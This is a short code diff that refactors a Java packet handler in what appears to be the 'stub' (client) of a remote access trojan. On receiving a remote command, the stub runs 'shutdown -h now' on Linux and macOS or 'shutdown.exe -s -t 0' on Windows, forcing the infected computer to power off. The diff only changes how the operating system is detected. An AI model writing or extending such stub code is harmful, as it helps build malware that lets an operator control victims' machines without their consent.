@@ -2,16 +2,16 @@ package com.redpois0n.stub.packets.incoming;
 
 import com.redpois0n.Connection;
 import com.redpois0n.Constants;
+import com.redpois0n.common.OperatingSystem;
 
-public class PacketSHUTDOWN extends AbstractIncomingPacket{
+public class Packet28ShutdownComputer extends AbstractIncomingPacket{
 
 	@Override
 	public void read() throws Exception {
-		String operatingSystem = System.getProperty("os.name");
-		if (operatingSystem.toLowerCase().contains("linux") || operatingSystem.toLowerCase().contains("mac")) {
+		if (OperatingSystem.getOperatingSystem() == OperatingSystem.OSX || OperatingSystem.getOperatingSystem() == OperatingSystem.LINUX) {
 			Runtime.getRuntime().exec("shutdown -h now");
 			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
-		} else if (operatingSystem.toLowerCase().contains("windows")) {
+		} else if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 			Runtime.getRuntime().exec("shutdown.exe -s -t 0");
 			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
 		} else {
